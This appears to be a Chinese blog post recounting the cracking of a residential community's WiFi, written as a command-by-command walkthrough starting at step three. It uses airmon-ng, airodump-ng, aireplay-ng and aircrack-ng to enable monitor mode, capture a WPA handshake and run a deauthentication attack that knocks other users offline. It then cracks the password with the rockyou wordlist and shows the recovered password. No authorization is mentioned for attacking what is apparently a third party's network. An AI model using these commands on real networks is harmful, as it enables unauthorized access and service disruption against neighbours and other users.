---
title: 记一次对小区wifi渗透
date: 2023-08-03 21:43:26
categories: "网络安全"
tags: "网安"
---
# wifi渗透(一)

### 第三步——检查并开启网卡的监听功能

airmon-ng：检查网卡是否支持监听功能的

![image-20220206191950754](https://picture.gotarget.top//image-20220206191950754.png)

airmon-ng start wlan0mon ：激活无线网卡的监听模式

![image-20220206192030956](https://picture.gotarget.top//image-20220206192030956.png)

### 第四步——扫描周边wifi信号

airodump-ng wlan0mon ：扫描当前周边环境的WiFi信号

![image-20220206192404063](https://picture.gotarget.top//image-20220206192404063.png)

**注意：找到你要破解的wifi信息，记住它的BSSID和CH,后面要用！**

### 第五步——抓包

下面里的部分信息根据自己的情况进行替换

抓包命令：airodump-ng -c ==CH号码== --bssid ==BSSID号码== -w /home/kali/桌面/handshake wlan0mon

**注意：**

```
-w后接抓包后得到的文件保存路径和名称，注意路径！ 我的用户名是kali，你的填你自己的
```

![image-20220206192728797](https://picture.gotarget.top//image-20220206192728797.png)

**注：这种方式是一种被动等待的方式，所以我们需要将链接在该wifi上的设备踢下线，以便我们快速抓包。**

**这里我们需要记下BSSID(WIFI路由地址)和STATION（链接设备号），接下来我们将该设备从该wifi链接状态下强制踢下线**

### 第六步——打掉连接

ACK 死亡攻击：aireplay-ng -0 10 -a BSSID号 -c STATION号 wlan0mon

```
10——是攻击次数，一般10次就足够我们抓到包了，如果将次数调整的很大，那么就会持续的进行攻击，导致该设备长期无法链接到该wifi!
```

**注：这样做将会导致连接在该wifi上的设备被强制下线，然后因为wifi的自动重连机制，使得我们可以快速抓到包**。

![image-20220206193900205](https://picture.gotarget.top//image-20220206193900205.png)

### 最后一步——破解

#### 破解语法：

aircrack-ng -w <指定字典> -b <目的路由MAC地址> <抓到的握手包>

**注**：目的路由MAC地址——就是BSSID 抓到的握手包——cap文件

#### kali自带字典：

aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 78:72:5D:E0:BC:37 /home/kali/桌面/handshake-0*.cap

**需要先解压**：gzip -d /usr/share/wordlists/rockyou.txt.gz

#### 自我指定字典：

aircrack-ng -w /home/kali/password.txt -b 78:72:5D:E0:BC:37 /home/kali/桌面/handshake-0*.cap

### 成功！

![image-20220206164700961](https://picture.gotarget.top//image-20220206164700961.png)

破解的wifi密码就为a123456789

